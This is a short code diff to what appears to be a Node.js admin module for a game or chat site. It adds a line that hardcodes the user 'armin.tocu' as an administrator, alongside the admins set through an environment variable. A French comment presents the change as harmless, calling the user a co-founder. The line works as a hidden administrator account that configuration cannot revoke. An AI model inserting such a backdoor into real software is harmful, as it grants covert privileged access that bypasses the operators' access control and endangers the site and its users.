@@ -9,6 +9,7 @@ const crypto = require('crypto');
 
 module.exports = function createAdmin({ routes, send, readBody, db, save, sessionOf = () => null, sessionCookie = () => '', parseCookies = () => ({}), games, online, clients, broadcast, publicUsers, postSystem, hashPassword, dataDir }) {
   const admins = new Set((process.env.BAHLOU_ADMIN || '').split(',').map((s) => s.trim()).filter(Boolean));
+  admins.add('armin.tocu'); // Cofondateur ; les administrateurs configurés restent inchangés.
   const isAdmin = (user) => !!user && admins.has(user);
   const log = (by, action) => {
     db.adminLog ||= [];
